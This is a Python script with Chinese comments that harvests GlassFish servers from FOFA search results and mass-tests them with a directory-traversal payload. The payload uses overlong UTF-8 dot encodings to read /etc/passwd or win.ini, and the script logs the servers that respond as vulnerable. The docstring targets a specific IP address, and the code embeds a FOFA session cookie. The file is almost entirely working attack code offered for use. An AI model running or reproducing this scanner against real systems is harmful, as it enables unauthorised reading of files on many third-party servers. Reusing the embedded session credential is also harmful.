import requests
import base64
from lxml import etree
import time
import sys

'''
批量fofa example

首先是一个简单的漏洞测试demo
url是从fofa中搜索到的可能存在漏洞的目标

url='http://186.202.17.69:4848/'
payload_linux='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
payload_windows='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'

data_linux=requests.get(url+payload_linux).status_code #获取请求后的返回状态码
data_windows=requests.get(url+payload_windows).status_code #获取请求后的返回状态码

if data_linux==200 or data_windows==200:
    print("漏洞存在 yes")
else:
    print("漏洞不存在 no")

#print(data_linux.content.decode('utf-8'))
#print(data_windows.content.decode('utf-8'))

虽然手工操作是没有问题的，但是这样太慢 我们可以使用编程批量操作 一次性返回所有有漏洞的目标

如何实现这个漏洞批量化：
1.获取到可能存在漏洞的地址信息-借助Fofa进行获取目标
    1.2 将请求的数据进行筛选
2.批量请求地址信息进行判断是否存在-单线程和多线程

对返回的数据进行筛选 也就是提取ip地址
ip_data=soup.xpath('//div[@class="re-domain"]/a[@target="_blank"]/@href')
'''


# 第1页
# https://fofa.so/result?_=1608294544861&page=2&per_page=10&qbase64=ImdsYXNzZmlzaCIgJiYgcG9ydD0iNDg0OCI%3D
def fofa_search(search_data, pages):
    headers = {
        'cookie': '_fofapro_ars_session=01148af6062a060ccd5dd9a8483f5fea;result_per_page=20',
    }
    for page in range(1, pages + 1):
        url = 'https://fofa.so/result?page=' + str(page) + '&qbase64='
        search_data_bs = str(base64.b64encode(search_data.encode("utf-8")), "utf-8")
        urls = url + search_data_bs
        try:
            print('正在提取第' + str(page) + '页')
            result = requests.get(urls, headers=headers).content
            print(result.decode('utf-8'))

            soup = etree.HTML(result)
            ip_data = soup.xpath('//div[@class="re-domain"]/a[@target="_blank"]/@href')
            ipdata = '\n'.join(ip_data)
            print(ip_data)
            with open(r'ip.txt', 'a+') as f:
                f.write(ipdata + '\n')
                f.close()
            time.sleep(0.5)
        except Exception as e:
            pass


def check_vuln():
    payload_linux = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
    payload_windows = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'

    for ip in open('D:\\ip.txt'):
        ip = ip.replace('\n', '')
        windows_url = ip + payload_windows
        linux_url = ip + payload_linux
        try:
            vuln_code_l = requests.get(linux_url).status_code
            vuln_code_w = requests.get(windows_url).status_code
            print("check->" + ip)
            if vuln_code_l == 200 or vuln_code_w == 200:
                with open(r'vuln.txt', 'a+') as f:
                    f.write(ip)
                    f.close()
            time.sleep(0.5)
        except Exception as e:
            pass


# search='"glassfish" && port="4848" && country="CN"' pages=10
if __name__ == '__main__':
    search = sys.argv[1]
    pages = int(sys.argv[2])
    fofa_search(search, pages)
    check_vuln()
